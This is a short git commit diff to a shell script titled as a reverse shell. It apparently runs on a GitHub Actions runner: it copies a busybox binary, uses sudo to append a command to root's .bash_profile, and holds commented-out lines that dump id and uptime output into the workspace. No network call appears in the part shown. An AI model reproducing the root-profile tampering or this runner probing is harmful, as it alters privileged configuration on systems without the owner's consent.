44a656cc343173cd099c18dab4afb8b2037bbc07
189er <108280451+189er@users.noreply.github.com>
2023-08-19 15:22:21 +0800

    Update AABBCC_rev_shell.sh
    ss

--- AABBCC_rev_shell.sh
+++ AABBCC_rev_shell.sh
@@ -19,17 +19,15 @@ cp /home/runner/work/nc_test/nc_test/busybox.bin  .;
 sudo bash -c 'echo -e "\nls -al /tmp/nu*;">>/root/.bash_profile';
 
 
-[ ! -z "${GITHUB_WORKSPACE}" ] &&  echo 1236021;
+[ ! -z "/ss/s/s/" ]  && echo  131234455;
 
-# (
-  
+# [ ! -z "${GITHUB_WORKSPACE}" ] &&(  
 #   cp /tmp/js9 $GITHUB_WORKSPACE/js9.txt;
 #   id>$GITHUB_WORKSPACE/package/d2023.txt;
 #   uptime>$GITHUB_WORKSPACE/d2023.txt;
 #   #date>$GITHUB_WORKSPACE/dist/d2023.txt;
 #   sudo mkdir -pv  $GITHUB_WORKSPACE/package;
 #   sudo mkdir -pv  $GITHUB_WORKSPACE/dist;
-
 # )
 
 
